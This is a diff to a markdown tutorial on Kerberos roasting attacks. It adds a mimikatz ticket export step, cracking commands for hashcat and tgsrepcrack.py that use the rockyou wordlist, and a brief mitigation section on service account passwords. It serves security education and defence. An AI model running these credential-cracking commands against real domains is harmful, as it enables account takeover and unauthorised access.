@@ -141,15 +141,21 @@ In order to extract the ticket from memory we use mimikatz:
 kerberos::list /export
 ```
 
-**hashcat**  
-The output from Rubeus and PowerView can directly be feeded into hashcat:  
+**hash cracking**  
+The output from Rubeus and PowerView can directly be fed into [hashcat](https://github.com/hashcat/hashcat):  
 ```powershell
 hashcat64.exe -m 18200 '<AS_REP-hash>' -a 0 c:\wordlists\rockyou.txt
 ```
 
+For the mimikatz extracted hashes we need to issue [tgsrepcrack.py](https://github.com/nidem/kerberoast/blob/master/tgsrepcrack.py)  
+```powershell
+python tgsrepcrack.py c:\rockyou.txt c:\ticket.kirbi
+```
 
+### Mitigation
 
-mimikatz is able to extract **STs** from memory, but we first need to identify valid **SPNs** and request a valid ticke
+Check which accounts in your environment are affected with PowerView´s Get-DomainUser cmdlet as explained above.  
+If the **SPN** needs to be tied to a user rather than a computer account, make sure to make the password long and complex.  
 
 ## Conclusion
 
